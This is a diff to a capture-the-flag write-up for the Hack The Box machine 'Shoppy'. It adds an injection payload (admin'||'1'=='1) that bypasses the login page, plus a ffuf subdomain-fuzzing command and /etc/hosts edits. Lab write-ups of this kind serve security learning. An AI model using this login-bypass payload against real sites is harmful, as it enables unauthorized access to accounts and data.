@@ -174,6 +174,17 @@ We have a login page, but we don't have creds we can use to login.
 
 Lets try SQLi bypass, 
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6c1f1a6-1f23-4808-9aa3-3539a5c82285)
+
+We can craft  a payload from that.
+
+username:```admin'||'1'=='1```            password:```admin```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb0bafee-2203-46ad-b39f-4b3d2f310b56)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6cee8c85-5b58-412b-9273-ce25cd3ad415)
+
+We are logged in hehe
+
 Lets continue with our enumeration by enumerating for subdomains,
 
 command:```ffuf -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 5```
@@ -185,9 +196,10 @@ Lets add the subdomain to our ```/etc/hosts``` file
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/shoppy]
 └─$ sudo nano /etc/hosts
+[sudo] password for bl4ck4non: 
                                                                                                                                                                                                 
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/shoppy]
-└─$ cat /etc/hosts
+└─$ cat /etc/hosts 
 127.0.0.1       localhost
 127.0.1.1       bl4ck4non
 
@@ -195,7 +207,7 @@ Lets add the subdomain to our ```/etc/hosts``` file
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-10.129.227.233 shoppy.htb, mattermost.shoppy.htb
+10.129.227.233 shoppy.htb mattermost.shoppy.htb
 ```
 Navigating to that subdomain
 
